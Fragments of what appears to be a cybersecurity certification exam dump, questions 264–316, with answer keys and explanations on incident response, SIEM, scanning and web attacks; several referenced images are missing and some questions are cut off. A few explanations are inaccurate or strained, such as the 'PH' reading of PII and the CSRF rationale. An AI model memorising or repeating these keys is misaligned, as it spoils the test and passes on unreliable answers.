\nA. Lessons learned  \nB. Scrum review  \nC. Root cause analysis  \nD. Regulatory compliance  \n  \nAnswer: A  \n  \n  \nQUESTION 264  \nAn analyst is becoming overwhelmed with the number of events that need to be investigated for a \ntimeline. Which of the following should the analyst focus on in order to move the incident \nforward?  \n  \nA. Impact  \nB. Vulnerability score  \nC. Mean time to detect  \nD. Isolation  \n  \nAnswer: A  \nExplanation:  \nThe analyst should focus on the impact of the events in order to move the incident forward. \nImpact is the measure of the potential or actual damage caused by an incident, such as data \nloss, financial loss, reputational damage, or regulatory penalties. Impact can help the analyst \nprioritize the events that need to be investigated based on their severity and urgency, and \nallocate the appropriate resources and actions to contain and remediate them. Impact can also \nhelp the analyst communicate the status and progress of the incident to the stakeholders and \ncustomers, and justify the decisions and recommendations made during the incident response. \nVulnerability score, mean time to detect, and isolation are all important metrics or actions for \nincident response, but they are not the main focus for moving the incident forward. Vulnerability \nscore is the rating of the likelihood and severity of a vulnerability being exploited by a threat actor. \nMean time to detect is the average time it takes to discover an incident. Isolation is the process of \ndisconnecting an affected system from the network to prevent further damage or spread of the \nincident.  \n  \n  \nQUESTION 265  \nTo minimize the impact of a security incident, a cybersecurity analyst has configured audit \nsettings in the organization's cloud services. Which of the following security controls has the \nanalyst configured?  \n  \nA. Preventive  \nB. Corrective  \nC. Directive  \nD. Detective  \n\n\n \n  \nAnswer: D Explanation:  \nAudit settings provide visibility into user actions and system events. These are classified as \ndetective controls because they enable the detection of anomalies, policy violations, or \nunauthorized access by generating logs or alerts. They do not prevent actions (Preventive) or \nreverse harm (Corrective), nor do they provide policy guidance (Directive).  \n  \n  \nQUESTION 266  \nA web developer reports the following error that appeared on a development server when testing \na new application:  \n  \n  \n  \nWhich of the following tools can be used to identify the application's point of failure?  \n  \nA. OpenVAS  \nB. Angry IP scanner  \nC. Immunity debugger  \nD. Burp Suite  \n  \nAnswer: C  \n  \n  \nQUESTION 267  \nA security team is concerned about recent Layer 4 DDoS attacks against the company website. \nWhich of the following controls would best mitigate the attacks?  \n  \nA. Block the attacks using firewall rules  \nB. Deploy an IPS in the perimeter network  \nC. Roll out a CDN  \nD. Implement a load balancer  \n  \nAnswer: C Explanation:  \nRolling out a CDN is the best control to mitigate the Layer 4 DDoS attacks against the company \nwebsite. A CDN is a Content Delivery Network, which is a system of distributed servers that \ndeliver web content to users based on their geographic location, the origin of the web page, and \nthe content delivery server. A CDN can help protect against Layer 4 DDoS attacks, which are \nvolumetric attacks that aim to exhaust the network bandwidth or resources of the target website \nby sending a large amount of traffic, such as SYN floods, UDP floods, or ICMP floods. A CDN can \nmitigate these attacks by distributing the traffic across multiple servers, caching the web content \ncloser to the users, filtering out malicious or unwanted traffic, and providing scalability and \nredundancy for the website.  \n\n\n \n  \n  \nQUESTION 268  \nAn analyst is reviewing system logs while threat hunting:  \n  \n  \n  \nWhich of the following hosts should be investigated first?  \n  \nA. PC1 \nB. PC2 \nC. PC3 \nD. PC4  \nE. PC5  \n  \nAnswer: C  \nExplanation:  \nUser gets a malicious Excel file via email and when opened Excel opens \"procdunp.exe\".  \n  \n  \nQUESTION 269  \nAn organization needs to bring in data collection and aggregation from various endpoints. Which \nof the following is the best tool to deploy to help analysts gather this data?  \n  \nA. DLP  \nB. NAC  \nC. EDR  \nD. NIDS  \n  \nAnswer: C Explanation:  \nEDR stands for Endpoint Detection and Response, which is a tool that collects and aggregates \ndata from various endpoints, such as laptops, servers, or mobile devices. EDR helps analysts \nmonitor, detect, and respond to threats and incidents on the endpoints. EDR is more suitable \nthan DLP (Data Loss Prevention), NAC (Network Access Control), or NIDS (Network Intrusion \nDetection System) for data collection and aggregation from endpoints.  \n  \n  \nQUESTION 270  \n\n\n \nA regulated organization experienced a security breach that exposed a list of customer names \nwith corresponding PII data. Which of the following is the best reason for developing the \norganization's communication plans?  \n  \nA. For the organization's public relations department to have a standard notification  \nB. To ensure incidents are immediately reported to a regulatory agency  \nC. To automate the notification to customers who were impacted by the breach  \nD. To have approval from executive leadership on when communication should occur  \n  \nAnswer: B Explanation:  \nDeveloping an organization's communication plans is crucial to ensure that incidents, especially \nthose involving sensitive data like PH (Protected Health) data, are promptly reported to the \nrelevant regulatory agencies. This is essential for compliance with legal and regulatory \nrequirements, which often mandate timely notification of data breaches. Effective communication \nplans help the organization manage the breach response process, mitigate potential legal \npenalties, and maintain transparency with regulatory bodies.  \n  \n  \nQUESTION 271  \nFollowing an incident, a security analyst needs to create a script for downloading the \nconfiguration of all assets from the cloud tenancy. Which of the following authentication methods \nshould the analyst use?  \n  \nA. MFA  \nB. User and password  \nC. PAM  \nD. Key pair  \n  \nAnswer: D Explanation:  \nKey pair authentication is a method of using a public and private key to securely access cloud \nresources, such as downloading the configuration of assets from a cloud tenancy. Key pair \nauthentication is more secure than user and password or PAM, and does not require an \nadditional factor like MFA.  \n  \n  \nQUESTION 272  \nA penetration tester is conducting a test on an organization's software development website. The \npenetration tester sends the following request to the web interface:  \n  \n\n\n \n  \n  \nWhich of the following exploits is most likely being attempted?  \n  \nA. SQL injection  \nB. Local file inclusion  \nC. Cross-site scripting  \nD. Directory traversal  \n  \nAnswer: A Explanation:  \nSQL injection is a type of attack that injects malicious SQL statements into a web application's \ninput fields or parameters, in order to manipulate or access the underlying database. The request \nshown in the image contains an SQL injection attempt, as indicated by the \"UNION SELECT\" \nstatement, which is used to combine the results of two or more queries. The attacker is trying to \nextract information from the database by appending the malicious query to the original one.  \n  \n  \nQUESTION 273  \nTwo employees in the finance department installed a freeware application that contained \nembedded malware. The network is robustly segmented based on areas of responsibility. These \ncomputers had critical sensitive information stored locally that needs to be recovered. The \ndepartment manager advised all department employees to turn off their computers until the \nsecurity team could be contacted about the issue. Which of the following is the first step the \nincident response staff members should take when they arrive?  \n  \nA. Turn on all systems, scan for infection, and back up data to a USB storage device.  \nB. Identify and remove the software installed on the impacted systems in the department.  \nC. Explain that malware cannot truly be removed and then reimage the devices.  \nD. Log on to the impacted systems with an administrator account that has privileges to perform \nbackups.  \nE. Segment the entire department from the network and review each computer offline.  \n  \nAnswer: E  \n\n\n \nExplanation:  \nSegmenting the entire department from the network and reviewing each computer offline is the \nfirst step the incident response staff members should take when they arrive. This step can help \ncontain the malware infection and prevent it from spreading to other systems or networks. \nReviewing each computer offline can help identify the source and scope of the infection, and \ndetermine the best course of action for recovery. Turning on all systems, scanning for infection, \nand backing up data to a USB storage device is a risky step, as it can activate the malware and \ncause further damage or data loss. It can also compromise the USB storage device and any \nother system that connects to it. Identifying and removing the software installed on the impacted \nsystems in the department is a possible step, but it should be done after segmenting the \ndepartment from the network and reviewing each computer offline. Explaining that malware \ncannot truly be removed and then reimaging the devices is a drastic step, as it can result in data \nloss and downtime. It should be done only as a last resort, and after backing up the data and \nverifying its integrity. Logging on to the impacted systems with an administrator account that has \nprivileges to perform backups is a dangerous step, as it can expose the administrator credentials \nand privileges to the malware, and allow it to escalate its access and capabilities.  \n  \n  \nQUESTION 274  \nA manufacturer has hired a third-party consultant to assess the security of an OT network that \nincludes both fragile and legacy equipment. Which of the following must be considered to ensure \nthe consultant does no harm to operations?  \n  \nA. Employing Nmap Scripting Engine scanning techniques  \nB. Preserving the state of PLC ladder logic prior to scanning  \nC. Using passive instead of active vulnerability scans  \nD. Running scans during off-peak manufacturing hours  \n  \nAnswer: C Explanation:  \nIn environments with fragile and legacy equipment, passive scanning is preferred to prevent any \npotential disruptions that active scanning might cause.  \nWhen assessing the security of an Operational Technology (OT) network, especially one with \nfragile and legacy equipment, it's crucial to use passive instead of active vulnerability scans. \nActive scanning can sometimes disrupt the operation of sensitive or older equipment. Passive \nscanning listens to network traffic without sending probing requests, thus minimizing the risk of \ndisruption.  \n  \n  \nQUESTION 275  \nA team of analysts is developing a new internal system that correlates information from a variety \nof sources, analyzes that information, and then triggers notifications according to company policy. \nWhich of the following technologies was deployed?  \n  \nA. SIEM  \nB. SOAR  \nC. IPS  \nD. CERT  \n  \nAnswer: A Explanation:  \nSIEM (Security Information and Event Management) technology aggregates and analyzes activity \nfrom many different resources across your IT infrastructure. The description of correlating \ninformation from various sources and triggering notifications aligns with the capabilities of a SIEM \nsystem.  \n\n\n \n  \n  \nQUESTION 276  \nWhich of following would best mitigate the effects of a new ransomware attack that was not \nproperly stopped by the company antivirus?  \n  \nA. Install a firewall.  \nB. Implement vulnerability management.  \nC. Deploy sandboxing.  \nD. Update the application blocklist.  \n  \nAnswer: C Explanation:  \nSandboxing is a technique that isolates potentially malicious programs or files in a controlled \nenvironment, preventing them from affecting the rest of the system. It can help mitigate the \neffects of a new ransomware attack by preventing it from encrypting or deleting important data or \nspreading to other devices.  \n  \n  \nQUESTION 277  \nA Chief Information Security Officer wants to implement security by design, starting with the \nimplementation of a security scanning method to identify vulnerabilities, including SQL injection, \nRFI, XSS, etc. Which of the following would most likely meet the requirement?  \n  \nA. Reverse engineering  \nB. Known environment testing  \nC. Dynamic application security testing  \nD.

The host is unresponsive to the ICMP request.  \nB. The host is running a vulnerable mail server.  \n\n\n \nC. The host is allowing unsecured FTP connections.  \nD. The host is vulnerable to web-based exploits.  \n  \nAnswer: D Explanation:  \nThe output shows that port 80 is open and running an HTTP service, indicating that the host \ncould potentially be vulnerable to web-based attacks. The other options are not relevant for this \npurpose: the host is responsive to the ICMP request, as shown by the \"Host is up\" message; the \nhost is not running a mail server, as there is no SMTP or POP3 service detected; the host is not \nallowing unsecured FTP connections, as there is no FTP service detected.   \n  \n  \nQUESTION 279  \nThe security team at a company, which was a recent target of ransomware, compiled a list of \nhosts that were identified as impacted and in scope for this incident. Based on the following \nhost list:   \n  \n  \nWhich of the following systems was most pivotal to the threat actor in its distribution of the \nencryption binary via Group Policy?  \n  \nA. SQL01  \nB. WK10-Sales07  \nC. WK7-Plant01  \nD. DCEast01  \nE. HQAdmin9  \n  \nAnswer: D Explanation:  \nBased on the list of hosts and their functions, DCEast01, which is a Domain Controller, would be \nthe most pivotal in the distribution of an encryption binary via Group Policy. Domain Controllers \nare responsible for security and administrative policies within a Windows Domain. Group Policy is \na feature of Windows that facilitates a wide range of advanced settings that administrators can \nuse to control the working environment of user accounts and computer accounts. Group Policy \ncan be used to deploy software, which in this case would be the encryption binary of the \nransomware. SQL01 is a database server and unlikely to be used for this purpose. WK10Sales07 \nand WK7-Plant01 are client machines, and HQAdmin9, although it is a network admin laptop, \nwould not typically be used to distribute policies across a network.  \n  \n  \nQUESTION 280  \nAfter a security assessment was done by a third-party consulting firm, the cybersecurity program \nrecommended integrating DLP and CASE to reduce analyst alert fatigue. Which of the following \nis the best possible outcome that this effort hopes to achieve?  \n  \nA. SIEM ingestion logs are reduced by 20%.  \nB. Phishing alerts drop by 20%.  \n\n\n \nC. False positive rates drop to 20%.  \nD. The MTTR decreases by 20%.  \n  \nAnswer: C Explanation:  \nReducing the rate of false positives is directly tied to reducing alert fatigue. Analysts spend a \nsignificant amount of time dealing with false positives, which can lead to burnout and missed \ngenuine threats. By lowering the false positive rate, the quality of alerts improves, making the \nanalysts work more efficient.  \n  \n  \nQUESTION 281  \nWhich of the following threat actors is most likely to target a company due to its questionable \nenvironmental policies?  \n  \nA. Hacktivist  \nB. Organized crime  \nC. Nation-state  \nD. Lone wolf  \n  \nAnswer: A Explanation:  \nHacktivists are threat actors who use cyberattacks to promote a social or political cause, such as \nenvironmentalism, human rights, or democracy. They may target companies that they perceive \nas violating their values or harming the public interest. Hacktivists often use techniques such as \ndefacing websites, launching denial-of-service attacks, or leaking sensitive data to expose or \nembarrass their targets.  \n  \n  \nQUESTION 282  \nA cybersecurity analyst is recording the following details:  \n  \n- ID  \n- Name  \n- Description  \n- Classification of information  \n- Responsible party  \n  \nIn which of the following documents is the analyst recording this information?  \n  \nA. Risk register  \nB. Change control documentation  \nC. Incident response playbook  \nD. Incident response plan  \n  \nAnswer: A Explanation:  \nA risk register typically contains details like ID, name, description, classification of information, \nand responsible party. It's used for tracking identified risks and managing them.  \nRecording details like ID, Name, Description, Classification of information, and Responsible party \nis typically done in a Risk Register. This document is used to identify, assess, manage, and \nmonitor risks within an organization. It's not directly related to incident response or change \ncontrol documentation.  \n  \n  \n\n\n \nQUESTION 283  \nA SOC manager is establishing a reporting process to manage vulnerabilities. Which of the \nfollowing would be the best solution to identify potential loss incurred by an issue?  \n  \nA. Trends  \nB. Risk score  \nC. Mitigation  \nD. Prioritization  \n  \nAnswer: B Explanation:  \nA risk score is a numerical value that represents the potential impact and likelihood of a \nvulnerability being exploited. It can help to identify the potential loss incurred by an issue and \nprioritize remediation efforts accordingly.  \n  \n  \nQUESTION 284  \nWhile configuring a SIEM for an organization, a security analyst is having difficulty correlating \nincidents across different systems. Which of the following should be checked first?  \n  \nA. If appropriate logging levels are set  \nB. NTP configuration on each system  \nC. Behavioral correlation settings  \nD. Data normalization rules  \n  \nAnswer: B Explanation:  \nThe NTP configuration on each system should be checked first, as it is essential for ensuring \naccurate and consistent time stamps across different systems. NTP is the Network Time \nProtocol, which is used to synchronize the clocks of computers over a network. NTP uses a \nhierarchical system of time sources, where each level is assigned a stratum number. The most \naccurate time sources, such as atomic clocks or GPS receivers, are at stratum 0, and the devices \nthat synchronize with them are at stratum 1, and so on. NTP clients can query multiple NTP \nservers and use algorithms to select the best time source and adjust their clocks accordingly. If \nthe NTP configuration is not consistent or correct on each system, the time stamps of the logs \nand events may differ, making it difficult to correlate incidents across different systems. This can \naffect the security analysis and correlation of events, as well as the compliance and auditing of \nthe network.  \n  \n  \nQUESTION 285  \nDuring a scan of a web server in the perimeter network, a vulnerability was identified that could \nbe exploited over port 3389. The web server is protected by a WAF. Which of the following best \nrepresents the change to overall risk associated with this vulnerability?  \n  \nA. The risk would not change because network firewalls are in use  \nB. The risk would decrease because RDP is blocked by the firewall  \nC. The risk would decrease because a web application firewall is in place  \nD. The risk would increase because the host is external facing  \n  \nAnswer: B  \nExplanation:  \nPort 3389 is commonly used by Remote Desktop Protocol (RDP), which is a service that allows \nremote access to a system. A vulnerability on this port could allow an attacker to compromise the \n\n\n \nweb server or use it as a pivot point to access other systems. However, if the firewall blocks this \nport, the risk of exploitation is reduced.  \n  \n  \nQUESTION 286  \nSeveral vulnerability scan reports have indicated runtime errors as the code is executing. The \ndashboard that lists the errors has a command-line interface for developers to check for \nvulnerabilities.   \nWhich of the following will enable a developer to correct this issue? (Choose two.)  \n  \nA. Performing dynamic application security testing  \nB. Reviewing the code  \nC. Fuzzing the application  \nD. Debugging the code  \nE. Implementing a coding standard  \nF. Implementing IDS  \n  \nAnswer: BD \nExplanation:  \nReviewing the code and debugging the code are two methods that can help a developer identify \nand fix runtime errors in the code. Reviewing the code involves checking the syntax, logic, and \nstructure of the code for any errors or inconsistencies. Debugging the code involves running the \ncode in a controlled environment and using tools such as breakpoints, watches, and logs to \nmonitor the execution and find the source of errors. Both methods can help improve the quality \nand security of the code.  \n  \n  \nQUESTION 287  \nA security analyst is trying to validate the results of a web application scan with Burp Suite. The \nsecurity analyst performs the following:  \n  \n  \n  \nWhich of the following vulnerabilities is the security analyst trying to validate?  \n  \nA. SQL injection  \n\n\n \nB. LFI  \nC. XSS  \nD. CSRF  \n  \nAnswer: B Explanation:  \nThe security analyst is validating a Local File Inclusion (LFI) vulnerability, as indicated by the \n\"/.../.../.../\" in the GET request which is a common indicator of directory traversal attempts \nassociated with LFI. The other options are not relevant for this purpose: SQL injection involves \ninjecting malicious SQL statements into a database query; XSS involves injecting malicious \nscripts into a web page; CSRF involves tricking a user into performing an unwanted action on a \nweb application.  \n  \n  \nQUESTION 288  \nA cybersecurity team has witnessed numerous vulnerability events recently that have affected \noperating systems.

Hybrid network architecture  \nC. Continuous authorization  \nD. Secure access service edge  \n  \nAnswer: A Explanation:  \nSystem hardening is the process of securing a system by reducing its attack surface, applying \npatches and updates, configuring security settings, and implementing security controls. System \nhardening can help prevent or mitigate vulnerability events that may affect operating systems. \nHost-based IPS, firewalls, and two-factor authentication are examples of security controls that \ncan be applied to harden a system.  \n  \n  \nQUESTION 289  \nA security analyst needs to secure digital evidence related to an incident. The security analyst \nmust ensure that the accuracy of the data cannot be repudiated. Which of the following should be \nimplemented?  \n  \nA. Offline storage  \nB. Evidence collection  \nC. Integrity validation  \nD. Legal hold  \n  \nAnswer: C Explanation:  \nIntegrity validation is the process of ensuring that the digital evidence has not been altered or \ntampered with during collection, acquisition, preservation, or analysis. It usually involves \ngenerating and verifying cryptographic hashes of the evidence, such as MD5 or SHA-1. Integrity \nvalidation is essential for maintaining the accuracy and admissibility of the digital evidence in \ncourt.  \n  \n  \nQUESTION 290  \nAn analyst investigated a website and produced the following:  \n  \n\n\n \n  \n  \nWhich of the following syntaxes did the analyst use to discover the application versions on this \nvulnerable website?  \n  \nA. nmap -sS -T4 -F insecure.org B. \nnmap -C insecure.org  \nC. nmap -sV -T4 -F insecure.org  \nD. nmap -A insecure.org  \n  \nAnswer: C Explanation:  \nThe analyst used the command nmap -sV -T4 -F insecure.org to discover the application versions \non the vulnerable website. The -sV option in Nmap is used to perform version detection, which \nidentifies the versions of the services running on open ports. The -T4 option sets the timing \ntemplate for faster execution, and -F scans only the most common ports.  \n  \n  \nQUESTION 291  \nA cybersecurity analyst is doing triage in a SIEM and notices that the time stamps between the \nfirewall and the host under investigation are off by 43 minutes. Which of the following is the most \nlikely scenario occurring with the time stamps?  \n  \nA. The NTP server is not configured on the host  \nB. The cybersecurity analyst is looking at the wrong information  \nC. The firewall is using UTC time  \nD. The host with the logs is offline  \n  \nAnswer: A Explanation:  \nThe most likely scenario occurring with the time stamps is that the NTP server is not configured \non the host. NTP is the Network Time Protocol, which is used to synchronize the clocks of \ncomputers over a network. NTP uses a hierarchical system of time sources, where each level is \nassigned a stratum number. The most accurate time sources, such as atomic clocks or GPS \nreceivers, are at stratum 0, and the devices that synchronize with them are at stratum 1, and so \non. NTP clients can query multiple NTP servers and use algorithms to select the best time source \nand adjust their clocks accordingly. If the NTP server is not configured on the host, the host will \nrely on its own hardware clock, which may drift over time and become inaccurate. This can cause \n\n\n \ndiscrepancies in the time stamps between the host and other devices on the network, such as the \nfirewall, which may be synchronized with a different NTP server or use a different time zone. This \ncan affect the security analysis and correlation of events, as well as the compliance and auditing \nof the network.  \n  \n  \nQUESTION 292  \nA payroll department employee was the target of a phishing attack in which an attacker \nimpersonated a department director and requested that direct deposit information be updated to \na new account. Afterward, a deposit was made into the unauthorized account. Which of the \nfollowing is one of the first actions the incident response team should take when they receive \nnotification of the attack?  \n  \nA. Scan the employee's computer with virus and malware tools  \nB. Review the actions taken by the employee and the email related to the event  \nC. Contact human resources and recommend the termination of the employee  \nD.

DNS exfiltration  \nB. DNS spoofing  \nC. DNS zone transfer  \nD. DNS poisoning  \n  \nAnswer: A  \n  \n  \nQUESTION 294  \nA small company does not have enough staff to effectively segregate duties to prevent error and \nfraud in payroll management. The Chief Information Security Officer (CISO) decides to maintain \nand review logs and audit trails to mitigate risk. Which of the following did the CISO implement?  \n  \nA. Corrective controls  \nB. Compensating controls  \nC. Operational controls  \nD. Administrative controls  \n  \nAnswer: B Explanation:  \n\n\n \nCompensating controls are alternative controls that provide a similar level of protection as the \noriginal controls, but are used when the original controls are not feasible or cost-effective. In this \ncase, the CISO implemented compensating controls by reviewing logs and audit trails to mitigate \nthe risk of error and fraud in payroll management, since segregating duties was not possible due \nto the small staff size.  \n  \n  \nQUESTION 295  \nAn email hosting provider added a new data center with new public IP addresses. Which of the \nfollowing most likely needs to be updated to ensure emails from the new data center do not get \nblocked by spam filters?  \n  \nA. DKIM  \nB. SPF  \nC. SMTP  \nD. DMARC  \n  \nAnswer: B Explanation:  \nSPF (Sender Policy Framework) is a DNS TXT record that lists authorized sending IP addresses \nfor a given domain. If an email hosting provider added a new data center with new public IP \naddresses, the SPF record needs to be updated to include those new IP addresses, otherwise \nthe emails from the new data center may fail SPF checks and get blocked by spam filters.  \n  \n  \nQUESTION 296  \nA laptop that is company owned and managed is suspected to have malware. The company \nimplemented centralized security logging. Which of the following log sources will confirm the \nmalware infection?  \n  \nA. XDR logs  \nB. Firewall legs  \nC. IDS logs  \nD. MFA logs  \n  \nAnswer: A Explanation:  \nXDR logs will confirm the malware infection because XDR is a system that collects and analyzes \ndata from multiple sources, such as endpoints, networks, cloud applications, and email security, \nto detect and respond to advanced threats12. XDR can provide a comprehensive view of the \nattack chain and the context of the malware infection. Firewall logs, IDS logs, and MFA logs are \nnot sufficient to confirm the malware infection, as they only provide partial or indirect information \nabout the network traffic, intrusion attempts, or user authentication.  \n  \n  \nQUESTION 297  \nWhich of the following best describes the goal of a disaster recovery exercise as preparation for \npossible incidents?  \n  \nA. To provide metrics and test continuity controls  \nB. To verify the roles of the incident response team  \nC. To provide recommendations for handling vulnerabilities  \nD. To perform tests against implemented security controls  \n  \n\n\n \nAnswer: A Explanation:  \nA disaster recovery exercise is a simulation or a test of the disaster recovery plan, which is a set \nof procedures and resources that are used to restore the normal operations of an organization \nafter a disaster or a major incident. The goal of a disaster recovery exercise is to provide metrics \nand test continuity controls, which are the measures that ensure the availability and resilience of \nthe critical systems and processes of an organization. A disaster recovery exercise can help \nevaluate the effectiveness, efficiency, and readiness of the disaster recovery plan, as well as \nidentify and address any gaps or issues .  \n  \n  \nQUESTION 298  \nA security analyst has prepared a vulnerability scan that contains all of the company's functional \nsubnets. During the initial scan users reported that network printers began to print pages that \ncontained unreadable text and icons. Which of the following should the analyst do to ensure this \nbehavior does not occur during subsequent vulnerability scans?  \n  \nA. Perform non-credentialed scans  \nB. Ignore embedded web server ports  \nC. Create a tailored scan for the printer subnet  \nD. Increase the threshold length of the scan timeout  \n  \nAnswer: C Explanation:  \nThe best way to prevent network printers from printing pages during a vulnerability scan is to \ncreate a tailored scan for the printer subnet that excludes the ports and services that trigger the \nprinting behavior. The other options are not effective for this purpose: performing noncredentialed \nscans may not reduce the impact on the printers; ignoring embedded web server ports may not \ncover all the possible ports that cause printing; increasing the threshold length of the scan \ntimeout may not prevent the printing from occurring.  \n  \n  \nQUESTION 299  \nA Chief Information Security Officer has outlined several requirements for a new vulnerability \nscanning project:  \n  \n- Must use minimal network bandwidth  \n- Must use minimal host resources  \n- Must provide accurate, near real-time updates  \n- Must not have any stored credentials in configuration on the scanner  \n  \nWhich of the following vulnerability scanning methods should be used to best meet these \nrequirements?  \n  \nA. Internal  \nB. Agent  \nC. Active  \nD. Uncredentialed  \n  \nAnswer: B  \nExplanation:  \nAgent-based vulnerability scanning is a method that uses software agents installed on the target \nsystems to scan for vulnerabilities. This method meets the requirements of the project because it \n\n\n \nuses minimal network bandwidth and host resources, provides accurate and near real-time \nupdates, and does not require any stored credentials on the scanner.  \n  \n  \nQUESTION 300  \nAn employee is no longer able to log in to an account after updating a browser. The employee \nusually has several tabs open in the browser. Which of the following attacks was most likely \nperformed?  \n  \nA. RFI  \nB. LFI  \nC. CSRF  \nD. XSS  \n  \nAnswer: C Explanation:  \nCSRF is an attack that forces an end user to execute unwanted actions on a web application in \nwhich they're currently authenticated. An attacker may trick the user into clicking a malicious link \nor submitting a forged form that performs an action on the user's behalf, such as changing their \npassword or transferring funds. If the user has several tabs open in the browser, they may not \nnotice the CSRF request or the resulting change in their account. Updating the browser may \nhave cleared the user's cache or cookies, preventing them from logging in to their account after \nthe CSRF attack.  \n  \n  \nQUESTION 301  \nWhich of the following does \"federation\" most likely refer to within the context of identity and \naccess management?  \n  \nA. Facilitating groups of users in a similar function or profile to system access that requires elevated \nor conditional access  \nB. An authentication mechanism that allows a user to utilize one set of credentials to access multiple \ndomains  \nC. Utilizing a combination of what you know who you are, and what you have to grant authentication \nto a user  \nD. Correlating one's identity with the attributes and associated applications the user has access to  \n  \nAnswer: B Explanation:  \nFederation is a system of trust between two parties for the purpose of authenticating users and \nconveying information needed to authorize their access to resources. By using federation, a user \ncan use one set of credentials to access multiple domains that trust each other.  \n  \n  \nQUESTION 302  \nThe Chief Information Security Officer for an organization recently received approval to install a \nnew EDR solution.

XDR  \nF. DLP  \n  \nAnswer: AB \nExplanation:  \nSOAR (Security Orchestration, Automation and Response) and SIEM (Security Information and \nEvent Management) are solutions that can help centralize the workload for the internal security \nteam by collecting, correlating, and analyzing alerts from different sources, such as EDR. SOAR \ncan also automate and streamline incident response workflows, while SIEM can provide \ndashboards and reports for security monitoring and compliance.  \n  \n  \nQUESTION 303  \nWhich of the following best describes the threat concept in which an organization works to ensure \nthat all network users only open attachments from known sources?  \n  \nA. Hacktivist threat  \nB. Advanced persistent threat  \nC. Unintentional insider threat  \nD. Nation-state threat  \n  \nAnswer: C Explanation:  \nAn unintentional insider threat is a type of network security threat that occurs when a legitimate \nuser of the network unknowingly exposes the network to malicious activity, such as opening a \nphishing email or a malware-infected attachment from an unknown source. This can compromise \nthe network security and allow attackers to access sensitive data or systems. The other options \nare not related to the threat concept of ensuring that all network users only open attachments \nfrom known sources.  \n  \n  \nQUESTION 304  \nA security analyst has received an incident case regarding malware spreading out of control on a \ncustomer's network. The analyst is unsure how to respond. The configured EDR has \nautomatically obtained a sample of the malware and its signature. Which of the following should \nthe analyst perform next to determine the type of malware based on its telemetry?  \n  \nA. Cross-reference the signature with open-source threat intelligence.  \nB. Configure the EDR to perform a full scan.  \nC. Transfer the malware to a sandbox environment.  \nD. Log in to the affected systems and run netstat.  \n  \nAnswer: A Explanation:  \nThe signature of the malware is a unique identifier that can be used to compare it with known \nmalware samples and their behaviors. Open-source threat intelligence sources provide \ninformation on various types of malware, their indicators of compromise, and their mitigation \nstrategies. By cross-referencing the signature with these sources, the analyst can determine the \ntype of malware and its telemetry. The other options are not relevant for this purpose: configuring \nthe EDR to perform a full scan may not provide additional information on the malware type; \ntransferring the malware to a sandbox environment may expose the analyst to further risks; \nlogging in to the affected systems and running netstat may not reveal the malware activity.  \n  \n  \n\n\n \nQUESTION 305  \nA network analyst notices a long spike in traffic on port 1433 between two IP addresses on \nopposite sides of a WAN connection. Which of the following is the most likely cause?  \n  \nA. A local red team member is enumerating the local RFC1918 segment to enumerate hosts  \nB. A threat actor has a foothold on the network and is sending out control beacons  \nC. An administrator executed a new database replication process without notifying the SOC  \nD. An insider threat actor is running Responder on the local segment, creating traffic replication  \n  \nAnswer: C  \nExplanation:  \nPort 1433 is commonly used by Microsoft SQL Server, which is a database management system. \nA spike in traffic on this port between two IP addresses on opposite sides of a WAN connection \ncould indicate a database replication process, which is a way of copying and distributing data \nfrom one database server to another. This could be a legitimate activity performed by an \nadministrator, but it should be communicated to the security operations center (SOC) to avoid \nconfusion and false alarms.  \n  \n  \nQUESTION 306  \nWhich of the following is a useful tool for mapping, tracking, and mitigating identified threats and \nvulnerabilities with the likelihood and impact of occurrence?  \n  \nA. Risk register  \nB. Vulnerability assessment  \nC. Penetration test  \nD. Compliance report  \n  \nAnswer: A Explanation:  \nA risk register is a useful tool for mapping, tracking, and mitigating identified threats and \nvulnerabilities with the likelihood and impact of occurrence. A risk register is a document that \nrecords the details of all the risks identified in a project or an organization, such as their sources, \ncauses, consequences, probabilities, impacts, and mitigation strategies. A risk register can help \nthe security team to prioritize the risks based on their severity and urgency, and to monitor and \ncontrol them throughout the project or the organization's lifecycle. A vulnerability assessment, a \npenetration test, and a compliance report are all methods or outputs of identifying and evaluating \nthe threats and vulnerabilities, but they are not tools for mapping, tracking, and mitigating them.  \n  \n  \nQUESTION 307  \nWhich of the following is often used to keep the number of alerts to a manageable level when \nestablishing a process to track and analyze violations?  \n  \nA.

Weaponization  \n  \nAnswer: D Explanation:  \nWeaponization is the stage of the Cyber Kill Chain where the threat actor creates or modifies a \nmalicious tool to use against a target. In this case, the threat actor compiles and tests a malicious \ndownloader, which is a type of weaponized malware.  \n  \n  \nQUESTION 313  \nAn organization would like to ensure its cloud infrastructure has a hardened configuration. A \nrequirement is to create a server image that can be deployed with a secure template. Which of \nthe following is the best resource to ensure secure configuration?  \n  \nA. CIS Benchmarks  \nB. PCI DSS  \nC. OWASP Top Ten  \nD. ISO 27001  \n  \nAnswer: A  \n  \n  \nQUESTION 314  \nA security analyst reviews the following Arachni scan results for a web application that stores PII \ndata:  \n  \n\n\n \n  \n  \nWhich of the following should be remediated first?  \n  \nA. SQL injection  \nB. RFI  \nC. XSS  \nD. Code injection  \n  \nAnswer: A Explanation:  \nSQL injection should be remediated first, as it is a high-severity vulnerability that can allow an \nattacker to execute arbitrary SQL commands on the database server and access, modify, or \ndelete sensitive data, including PII. According to the Arachni scan results, there are two instances \nof SQL injection and three instances of blind SQL injection (two timing attacks and one differential \nanalysis) in the web application. These vulnerabilities indicate that the web application does not \nproperly validate or sanitize the user input before passing it to the database server, and thus \nexposes the database to malicious queries. SQL injection can have serious consequences for the \nconfidentiality, integrity, and availability of the data and the system, and can also lead to further \nattacks, such as privilege escalation, data exfiltration, or remote code execution. Therefore, SQL \ninjection should be the highest priority for remediation, and the web application should implement \ninput validation, parameterized queries, and least privilege principle to prevent SQL injection \nattacks.  \n  \n  \nQUESTION 315  \nWhich of the following stakeholders are most likely to receive a vulnerability scan report? \n(Choose two.)  \n  \nA. Executive management  \nB. Law enforcement  \nC. Marketing  \nD. Legal  \nE. Product owner  \nF. Systems administration  \n  \n\n\n \nAnswer: AF \nExplanation:  \nExecutive management and systems administration are the most likely stakeholders to receive a \nvulnerability scan report because they are responsible for overseeing the security posture and \nremediation efforts of the organization. Law enforcement, marketing, legal, and product owner \nare less likely to be involved in the vulnerability management process or need access to the scan \nresults.   \n  \n  \nQUESTION 316  \nWhich of the following techniques can help a SOC team to reduce the number of alerts related to \nthe internal security activities that the analysts have to triage?  \n  \nA. Enrich the SIEM-ingested data to include all data required for triage  \nB. Schedule a task to disable alerting when vulnerability scans are executing  \nC. Filter all alarms in the SIEM with low seventy  \nD. Add a SOAR rule to drop irrelevant and duplicated notifications  